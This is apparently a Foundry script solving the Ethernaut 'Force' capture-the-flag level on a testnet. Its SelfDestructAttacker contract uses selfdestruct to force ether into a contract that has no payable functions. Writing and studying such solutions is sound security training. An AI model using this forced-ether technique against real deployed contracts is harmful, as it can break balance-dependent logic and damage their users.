// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here

contract ForceSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xb6c2Ec883DaAac76D8922519E63f875c2ec65575;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    // forge script script/solutions/07-Force.s.sol:ForceSolution --rpc-url $SEPOLIA_RPC
    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        SelfDestructAttacker attacker = new SelfDestructAttacker();
        attacker.attack{value: 0.001 ether}(challengeInstance);

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(7));
    }
}

contract SelfDestructAttacker {
    function attack(address target) public payable {
        require(msg.value > 0, "Need to send some ether");
        selfdestruct(payable(target));
    }
}
